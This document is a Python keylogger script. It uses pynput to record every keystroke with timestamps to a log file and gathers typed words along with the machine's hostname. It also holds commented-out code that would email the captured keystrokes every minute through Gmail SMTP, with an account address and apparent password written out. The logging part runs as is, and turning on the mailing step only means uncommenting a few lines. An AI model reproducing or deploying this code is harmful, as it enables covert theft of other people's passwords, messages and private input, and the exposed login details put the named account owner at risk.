from pynput.keyboard import Key, Listener
import logging
import datetime
import smtplib
import platform
#import urllib2

global maildata
global sendfreq
global sent
global mins
global word

maildata=[]
sendfreq=1 #in minutes
sent=False
mins=-sendfreq
word=''
hostname=platform.node()

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def gmail_on():
    try:
        urllib2.urlopen('http://52.97.131.226', timeout=1)
        return True
    except urllib2.URLError as err:
        return False

def on_press(key):
    logging.info(str(key))

    global maildata
    global sendfreq
    global sent
    global mins
    global word

    #print(abs(mins-datetime.datetime.now().minute))
    #print(sent)
    

    if len(str(key))!=3:
        maildata.append(word)
        maildata.append(str(key))
        print(maildata)
        word=''
    else:
        word=word+str(key)[1]
    
    
    print(word)

    if sent==True and abs(mins-datetime.datetime.now().minute)>0:
        sent=False
    if abs(mins-datetime.datetime.now().minute)>=sendfreq and sent==False:
        mins=datetime.datetime.now().minute
        
        print('sending email')
        #server = smtplib.SMTP('smtp.gmail.com', 587)
        #server.starttls()
        #server.login("band.mishaps@gmail.com", "Baobab7512")
        #server.sendmail("band.mishaps@gmail.com", "band.mishaps@gmail.com", str(hostname)+'\n'+str(maildata))
        #server.quit()
        print('email sent')
        print(maildata)
        sent=True
        maildata=[]

with Listener(on_press=on_press) as listener:
    listener.join()
